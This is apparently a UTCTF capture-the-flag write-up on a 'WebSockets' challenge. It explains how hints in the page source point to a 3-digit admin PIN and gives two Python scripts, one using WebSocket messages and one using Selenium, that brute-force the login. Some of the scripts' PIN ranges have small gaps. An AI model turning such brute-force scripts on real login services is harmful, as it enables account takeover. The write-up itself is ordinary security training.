# WebSockets

### 1. Initial reconnaissance:

This is the first appearance of this challenge. There are only 2 functions in the given web app: the homepage and `/internal/login`.

![image](https://user-images.githubusercontent.com/61876488/158421381-c8fe5b3a-f60b-4975-9746-eef8e2557bb4.png)

![image](https://user-images.githubusercontent.com/61876488/158421488-2fb1c34a-f299-4791-b1dd-9de850817ba6.png)

For some reasons, when we click the "Contact us" button in the homepage, there is no "Contact us" function.

![image](https://user-images.githubusercontent.com/61876488/158421939-a7876768-8919-4d29-b13c-014a9ff92a31.png)

I have found the reasons behind when `CTRL + U` and view source. You can see in the HTML comment above the anchor tag.

![image](https://user-images.githubusercontent.com/61876488/158429913-e62fe44b-97cd-444d-9f67-89d1484f24b1.png)

It said: `...for some reason only the 'admin' account can change it`, this means we will try to log in as `admin`. Hence go to `/internal/login` and check it out!

![image](https://user-images.githubusercontent.com/61876488/158433337-494e236a-b82e-4d35-bb8a-b09b8366e22a.png)

It said `...we still have some old 3-digit pins left`, this means beside the username given in the first hint, the PIN we will try to firgue out have only 3 digits. Super easy to brute force!!

### 2. Analysis:

Well, I have to take my words back =))). It is not easy if you brute force as a blind. Because this login page use websockets to send their data from the login form. First of all, to establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:

![image](https://user-images.githubusercontent.com/61876488/158437197-4fe1e9f3-dca2-4c6a-94a3-e9087b4c1fdc.png)

After that when checking `WebSockets history` in Burp Suite, we can see some WebSocket messages sent between client and server:

![image](https://user-images.githubusercontent.com/61876488/158438334-72144648-b0f3-4f52-b2ff-43a2a8a38dbf.png)

According the directions of websockets, here is my idea to exploit:

- Create a list of PIN to brute force, from 000 to 999.
- For each PIN in the list, send a series of **websockets message from client to server**: `begin` -> `user admin` -> `pass <put the PIN here>`.
- If `bad pass` does not appear in the **websockets message from server to client**, maybe we will log in successfully and the PIN just sent is the right one.

### 3. Exploit:

This is [my exploit code](solve2.py), using [websocket-client](https://pypi.org/project/websocket-client/) module in Python:

```python
from websocket import create_connection

def brute_list(): # Create a list of PIN to brute force, from 000 to 999.
    brute = [] 
    for i in range(1,9):
        brute.append('00'+str(i))
    for i in range(10,99):
        brute.append('0'+str(i))
    for i in range(100,1000):
        brute.append(str(i))
    return brute

def solve():
    brute = brute_list()
    print('Try to connect!')
    for i in brute:    # For each PIN in the list, send a series of websockets message from client to server: begin -> user admin -> pass <put the PIN here>.
        ws = create_connection("ws://web1.utctf.live:8651/internal/ws") 
        ws.send("begin")
        ws.send("user admin")
        print('Pass: '+str(i))
        ws.send("pass {}".format(i))
        if 'badpass' not in ws.recv():
            print(ws.recv())
        ws.close()

if __name__=="__main__":
    solve()
```

After a while since we run this code, there is a PIN sent and then returned to us a session token. It is `907` and this is the right PIN.

![image](https://user-images.githubusercontent.com/61876488/158443448-2453fddf-07d1-4c55-a352-6e76c9a3c19e.png)

Login with the PIN `907` and get the flag:

![image](https://user-images.githubusercontent.com/61876488/158443658-328a8eaa-6c25-4fc7-9184-bcdaeebe8dec.png)

There is [an another amazing way](solve1.py) to exploit from my teammate [Gourav Suram](https://github.com/heapbytes). He used [selenium](https://selenium-python.readthedocs.io/):

```python
from selenium.webdriver.common.keys import Keys
from selenium import *
from pprint import pprint


driver=webdriver.Chrome('./Downloads/chromedriver')
driver.maximize_window()
driver.get('http://web1.utctf.live:8651/internal/login')

for i in range(100,999):

    try:
        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[1]').clear()
        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[1]').send_keys("admin")
        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[2]').clear()
        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[2]').send_keys(str(i))

        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[3]').click()
        m=driver.find_element_by_xpath('/html/body/div[1]/div/span')

        if m.text!='Incorrect PIN':
            print(m)
    except:
        break
```        
     

